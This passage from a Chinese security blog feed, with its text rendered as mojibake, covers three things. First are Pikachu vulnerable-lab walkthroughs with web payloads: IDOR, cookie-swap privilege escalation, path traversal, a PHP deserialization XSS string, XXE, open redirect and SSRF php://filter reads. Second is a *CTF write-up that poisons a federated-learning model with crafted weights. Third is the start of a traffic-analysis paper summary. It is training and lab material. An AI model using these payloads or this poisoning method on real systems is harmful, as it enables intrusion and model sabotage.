class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><h3 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h3><p>ç™»å½•adminç”¨æˆ·åˆ›å»ºæ–°ç”¨æˆ·ï¼Œç„¶åé€€å‡ºï¼ŒburpæŠ“å–æ­¤æ¬¡æ“ä½œå¹¶æ”¾å…¥repeateræ¨¡å—ã€‚</p><p>ç™»å½•æ™®é€šç”¨æˆ·ï¼Œé€šè¿‡burpè·å–cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=e6e5csjr6mdrmnuappdgi1c0qb</span><br></pre></td></tr></table></figure><p>å°†adminç”¨æˆ·cookieæ›¿æ¢ä¸ºæ™®é€šç”¨æˆ·cookieå¹¶é‡æ–°æäº¤è¯·æ±‚</p><p><img src="https://s2.loli.net/2022/04/21/4iRqaw9ZCJBeQzg.png" alt="overpermission_1.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä»¥æ™®é€šç”¨æˆ·èº«ä»½ä½¿ç”¨adminç”¨æˆ·æƒé™æ·»åŠ äº†ä¸€ä¸ªæ–°ç”¨æˆ·</p><p><img src="https://s2.loli.net/2022/04/21/QeqwtoVcjYCk3OK.png" alt="overpermission_2.png"></p><h2 id="x2F-x2F"><a href="#x2F-x2F" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h2><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/dir/dir_list.php?title=../dir.php</span><br></pre></td></tr></table></figure><h2 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><h3 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h3><p>ç›´æ¥æŸ¥çœ‹æºä»£ç ï¼š</p><p><img src="https://s2.loli.net/2022/04/21/uq2pokJCiWRdlch.png" alt="info_1.png"></p><p>ç›´æ¥è¾“å…¥payloadäº¦å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure><h2 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h2><h3 id="PHPååºåˆ—åŒ–æ¼æ´"><a href="#PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPååºåˆ—åŒ–æ¼æ´"></a>PHPååºåˆ—åŒ–æ¼æ´</h3><p>ä½¿ç”¨æ–‡ä»¶ser.phpè·å–payloadï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°payloadä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">35</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="XXEæ¼æ´"><a href="#XXEæ¼æ´" class="headerlink" title="XXEæ¼æ´"></a>XXEæ¼æ´</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY hacker &quot;evolution&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure><h2 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h2><h3 id="ä¸å®‰å…¨çš„URLè·³è½¬"><a href="#ä¸å®‰å…¨çš„URLè·³è½¬" class="headerlink" title="ä¸å®‰å…¨çš„URLè·³è½¬"></a>ä¸å®‰å…¨çš„URLè·³è½¬</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com/</span><br></pre></td></tr></table></figure><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>è‹¥ç‚¹å‡»åæ— è¯—å¥æ˜¾ç¤ºï¼Œå¯ä»¥æŸ¥çœ‹æ˜¯å¦é“¾æ¥åœ°å€æ˜¯å¦å†™äº†è‡ªå·±çš„ç«¯å£å·ã€‚</p><h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php</span><br></pre></td></tr></table></figure><p>è·å¾—ç»“æœå†ç”¨base64è§£å¯†å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> pikachué¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022StarCTF-Misc-babyFL</title>
      <link href="/2022/04/20/2022StarCTF-Misc-babyFL/"/>
      <url>/2022/04/20/2022StarCTF-Misc-babyFL/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-CTF-Misc-babyFL-WPï¼ˆAIå®‰å…¨ï¼‰"><a href="#2022-CTF-Misc-babyFL-WPï¼ˆAIå®‰å…¨ï¼‰" class="headerlink" title="2022 *CTF Misc babyFL WPï¼ˆAIå®‰å…¨ï¼‰"></a>2022 *CTF Misc babyFL WPï¼ˆAIå®‰å…¨ï¼‰</h1><h2 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h2><p><img src="https://s2.loli.net/2022/04/20/qLvKly2XEbeofHA.png" alt="1.png"></p><blockquote><p><strong>æºç é“¾æ¥ï¼š</strong></p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A">https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A</a><br>æå–ç ï¼špl5w </p></blockquote><p><strong>æ¨èä½¿ç”¨jupyter</strong></p><h2 id="é¢˜ç›®åˆ†æï¼š"><a href="#é¢˜ç›®åˆ†æï¼š" class="headerlink" title="é¢˜ç›®åˆ†æï¼š"></a>é¢˜ç›®åˆ†æï¼š</h2><p>å…ˆçœ‹æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;/home/ctf/model&#x27;</span>):</span><br><span class="line">            os.mkdir(<span class="string">&quot;/home/ctf/model&quot;</span>)</span><br><span class="line">            train_models() <span class="comment">#è®­ç»ƒæ¨¡å‹</span></span><br><span class="line">        parameters = load_parameters() <span class="comment">#åŠ è½½æ­£ç¡®è¯†åˆ«çš„æ¨¡å‹çš„å‚æ•°</span></span><br><span class="line">        parameters = get_input_parameter(parameters) <span class="comment">#æ·»åŠ è‡ªå·±è¾“å…¥çš„æƒé‡</span></span><br><span class="line">        model = aggregation(parameters) <span class="comment">#ç”¨æ›´æ–°åçš„æƒé‡ç»„åˆæ›´æ–°æ¨¡å‹</span></span><br><span class="line">        test(model) <span class="comment">#æµ‹è¯•æ¨¡å‹ï¼Œé”™è¯¯è¯†åˆ«æ•°å­—çš„æ­£ç¡®ç‡é«˜äº95%å³å¯è·å–flag</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><p>åˆ†æå¯çŸ¥ï¼Œéœ€è¦è‡ªå·±è¾“å…¥ä¸€ç»„å‚æ•°æ¥ä½¿å¾—acc&gt;0.95æ¥è·å–flagã€‚</p><p><img src="https://s2.loli.net/2022/04/20/BI6W8g4DruHeXA3.png" alt="2.png"></p><p>è§‚å¯Ÿload_test_dataå‡½æ•°å¯çŸ¥ï¼Œæµ‹è¯•æ‰€ç”¨çš„æ•°æ®æ˜¯é”™è¯¯çš„ï¼Œä¸æ­£ç¡®è¯†åˆ«çš„æ•°å­—æ ‡ç­¾ç›¸åï¼ˆ0è¢«é”™è¯¯è¯†åˆ«ä¸º9ï¼‰ï¼Œæ•…æ•´ä½“æ€è·¯ä¸ºï¼Œåˆ†åˆ«è®­ç»ƒæ­£ç¡®è¯†åˆ«å’Œé”™è¯¯è¯†åˆ«ä¸¤ä¸ªæ¨¡å‹ï¼Œç„¶åç”¨<code>21*é”™è¯¯æ¨¡å‹å‚æ•°æƒé‡-n*æ­£ç¡®æ¨¡å‹å‚æ•°æƒé‡=è¦è¾“å…¥çš„å‚æ•°æƒé‡</code>è·å–è¾“å…¥å‚æ•°å¹¶ä¿å­˜ã€‚(nå–0-4ä¸­çš„æ•°å³å¯)</p><h2 id="é¢˜ç›®è§£ç­”ï¼š"><a href="#é¢˜ç›®è§£ç­”ï¼š" class="headerlink" title="é¢˜ç›®è§£ç­”ï¼š"></a>é¢˜ç›®è§£ç­”ï¼š</h2><h3 id="è®­ç»ƒæ­£ç¡®æ¨¡å‹ï¼š"><a href="#è®­ç»ƒæ­£ç¡®æ¨¡å‹ï¼š" class="headerlink" title="è®­ç»ƒæ­£ç¡®æ¨¡å‹ï¼š"></a>è®­ç»ƒæ­£ç¡®æ¨¡å‹ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_true</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;1.h5&quot;</span>)<span class="comment">#æ­£ç¡®æ¨¡å‹çš„å‚æ•°</span></span><br></pre></td></tr></table></figure><h3 id="è®­ç»ƒé”™è¯¯æ¨¡å‹ï¼š"><a href="#è®­ç»ƒé”™è¯¯æ¨¡å‹ï¼š" class="headerlink" title="è®­ç»ƒé”™è¯¯æ¨¡å‹ï¼š"></a>è®­ç»ƒé”™è¯¯æ¨¡å‹ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_false</span>():</span><br><span class="line">    x, y = load_test_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;2.h5&quot;</span>)<span class="comment">#é”™è¯¯æ¨¡å‹å‚æ•°</span></span><br></pre></td></tr></table></figure><h3 id="ä¿å­˜æƒé‡ï¼š"><a href="#ä¿å­˜æƒé‡ï¼š" class="headerlink" title="ä¿å­˜æƒé‡ï¼š"></a>ä¿å­˜æƒé‡ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model1 = load_model(<span class="string">&#x27;2.h5&#x27;</span>)</span><br><span class="line">param2 = model1.get_weights()</span><br><span class="line">model2 = load_model(<span class="string">&#x27;1.h5&#x27;</span>)</span><br><span class="line">param1 = model2.get_weights()</span><br><span class="line">weights = []</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(param2)):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    layer1 = param1[i]</span><br><span class="line">    layer2 = param2[i]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="built_in">sum</span> = layer2*<span class="number">21</span>-layer1</span><br><span class="line">    weights.append(<span class="built_in">sum</span>)</span><br><span class="line">    arr = np.array(<span class="built_in">sum</span>, <span class="built_in">float</span>)</span><br><span class="line">    arr = arr.ravel()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        f.write(<span class="built_in">str</span>(arr[i])+<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="æ­å»ºæœ¬åœ°ç¯å¢ƒå¹¶æµ‹è¯•ï¼š"><a href="#æ­å»ºæœ¬åœ°ç¯å¢ƒå¹¶æµ‹è¯•ï¼š" class="headerlink" title="æ­å»ºæœ¬åœ°ç¯å¢ƒå¹¶æµ‹è¯•ï¼š"></a>æ­å»ºæœ¬åœ°ç¯å¢ƒå¹¶æµ‹è¯•ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.layers <span class="keyword">import</span>  Dense, Conv2D, Flatten, MaxPooling2D</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"></span><br><span class="line">participant_number = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_model</span>():</span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">10</span>, (<span class="number">3</span>, <span class="number">3</span>), input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">20</span>, (<span class="number">3</span>, <span class="number">3</span>)))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(units=<span class="number">100</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(units=<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line">    model.<span class="built_in">compile</span>(loss=keras.losses.SparseCategoricalCrossentropy(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>],</span><br><span class="line">                  optimizer=keras.optimizers.Adam(lr=<span class="number">0.001</span>))</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (_, _), (x, y) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        model = new_model()</span><br><span class="line">        model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">10</span>)</span><br><span class="line">        model.save(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aggregation</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;aggregation&#x27;</span>)</span><br><span class="line">    weights = []</span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        l = <span class="built_in">len</span>(layer)</span><br><span class="line">        <span class="keyword">for</span> temp <span class="keyword">in</span> layer:</span><br><span class="line">            <span class="built_in">sum</span> = <span class="built_in">sum</span> + temp</span><br><span class="line">        weights.append(<span class="built_in">sum</span> / l)</span><br><span class="line">    model = new_model()</span><br><span class="line">    l = <span class="built_in">len</span>(model.get_weights())</span><br><span class="line">    model.set_weights(weights)</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">model</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    my_x, my_y = load_test_data()</span><br><span class="line">    loss, acc = model.evaluate(my_x, my_y, batch_size=<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">if</span> acc &gt; <span class="number">0.95</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;FLAG GET!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you fail&quot;</span>, acc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_parameters</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;load parameter&#x27;</span>)</span><br><span class="line">    parameters = []</span><br><span class="line">    models = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        models.append(load_model(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        layer = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">            temp = models[j].get_weights()</span><br><span class="line">            layer.append(temp[i])</span><br><span class="line">        parameters.append(layer)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_input_parameter_auto</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;get input parameter&#x27;</span>)</span><br><span class="line">    myid = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;next layer:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(layer[<span class="number">0</span>].shape,<span class="string">&quot; &quot;</span>,mylayers[myid].shape)</span><br><span class="line">        input_weight = mylayers[myid]</span><br><span class="line">        myid = myid + <span class="number">1</span></span><br><span class="line">        layer.append(input_weight)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;model&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;model&quot;</span>)</span><br><span class="line">        train_models()</span><br><span class="line">        </span><br><span class="line">dict_shape = &#123;<span class="number">0</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">10</span>), <span class="number">1</span>:(<span class="number">10</span>,), <span class="number">2</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">20</span>), <span class="number">3</span>:(<span class="number">20</span>,), </span><br><span class="line">                  <span class="number">4</span>:(<span class="number">2420</span>, <span class="number">100</span>), <span class="number">5</span>:(<span class="number">100</span>,), <span class="number">6</span>:(<span class="number">100</span>, <span class="number">10</span>), <span class="number">7</span>:(<span class="number">10</span>,)&#125; <span class="comment">#æ¯ä¸€å±‚çš„æƒé‡ç»“æ„</span></span><br><span class="line">mylayers = []</span><br><span class="line"><span class="keyword">for</span> inde <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;inde&#125;</span>.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file = f.readlines()</span><br><span class="line">mylayer = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> file:</span><br><span class="line">item = item.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">item = item.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">mylayer.append(item)</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>]</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mylayer)):</span><br><span class="line">mylayer[i] = <span class="built_in">float</span>(mylayer[i])</span><br><span class="line">pas = []</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dict_shape[inde])):</span><br><span class="line">pas.append(<span class="built_in">int</span>(dict_shape[inde][num]))</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(pas)==<span class="number">4</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span class="number">0</span>],pas[<span class="number">1</span>],pas[<span class="number">2</span>],pas[<span class="number">3</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">2</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span class="number">0</span>],pas[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">1</span>):</span><br><span class="line">mylayers.append(np.array(mylayer))</span><br><span class="line"><span class="built_in">print</span>(mylayers[inde].shape)</span><br><span class="line">f.close()</span><br><span class="line">parameters = load_parameters()</span><br><span class="line">parameters = get_input_parameter_auto(parameters)</span><br><span class="line">model = aggregation(parameters)</span><br><span class="line">test(model)</span><br></pre></td></tr></table></figure><p>è¿è¡Œåç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/04/20/nydkIf1mMFl3NQe.png" alt="3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> AI </tag>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
            <tag> 2022*CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Auto-Traffic-Analysis</title>
      <link href="/2022/04/06/Auto-Traffic-Analysis/"/>
      <url>/2022/04/06/Auto-Traffic-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="New-Directions-in-Automated-Traffic-Analysisè®ºæ–‡å­¦ä¹ "><a href="#New-Directions-in-Automated-Traffic-Analysisè®ºæ–‡å­¦ä¹ " class="headerlink" title="New Directions in Automated Traffic Analysisè®ºæ–‡å­¦ä¹ "></a>New Directions in Automated Traffic Analysisè®ºæ–‡å­¦ä¹ </h1><blockquote><p><strong>è®ºæ–‡é“¾æ¥</strong>ï¼š<a href="https://dl.acm.org/doi/10.1145/3460120.3484758">New Directions in Automated Traffic Analysis | Proceedings of the 2021 ACM SIGSAC Conference on Computer and Communications Security</a></p></blockquote><h2 id="æ–‡ç« ä¸»è¦ä¿¡æ¯"><a href="#æ–‡ç« ä¸»è¦ä¿¡æ¯" class="headerlink" title="æ–‡ç« ä¸»è¦ä¿¡æ¯"></a>æ–‡ç« ä¸»è¦ä¿¡æ¯</h2><table><thead><tr><th>è®ºæ–‡åç§°</th><th align="center">New Directions in Automated Traffic Analysis</th></tr></thead><tbody><tr><td>å½•ç”¨ä¿¡æ¯</td><td align="center">CCS 2021ï¼ˆCCF-Aï¼‰</td></tr><tr><td>ä½œè€…</td><td align="center"><a href="https://www.cs.princeton.edu/~jordanah/"> Jordan Holland</a>, Paul Schmitt, Nick Feamster, Prateek Mittal</td></tr><tr><td>è®ºæ–‡é“¾æ¥</td><td align="center"><a href="https://dl.acm.org/doi/10.1145/3460120.3484758">https://dl.acm.org/doi/10.1145/3460120.3484758</a></td></tr><tr><td>æºç </td><td align="center"><a href="https://github.com/nprint/nprint"> https://github.com/nprint/nprint</a></td></tr><tr><td>æ•°æ®é›†</td><td align="center"><a href="https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F">https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F</a></td></tr></tbody></table><h2 id="æ‘˜è¦"><a href="#æ‘˜è¦" class="headerlink" title="æ‘˜è¦"></a>æ‘˜è¦</h2><p>ç›®å‰,æœºå™¨å­¦ä¹ æŠ€æœ¯è¢«å¹¿æ³›åº”ç”¨äºå…¥ä¾µæ£€æµ‹ã€åº”ç”¨ç¨‹åºè¯†åˆ«ç­‰ç½‘ç»œæµé‡åˆ†æä»»åŠ¡ä¸­ã€‚ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨æœºå™¨å­¦ä¹ æ–¹æ³•æ—¶ï¼Œç‰¹å¾æå–ã€æ¨¡å‹é€‰æ‹©ã€å‚æ•°è°ƒä¼˜ç­‰ä¼—å¤šå› ç´ å†³å®šç€æ¨¡å‹çš„æ€§èƒ½ï¼Œæ¯å½“é¢å¯¹ä¸åŒçš„ç½‘ç»œæµé‡æˆ–æ–°çš„ä»»åŠ¡ï¼Œå°±éœ€è¦ç 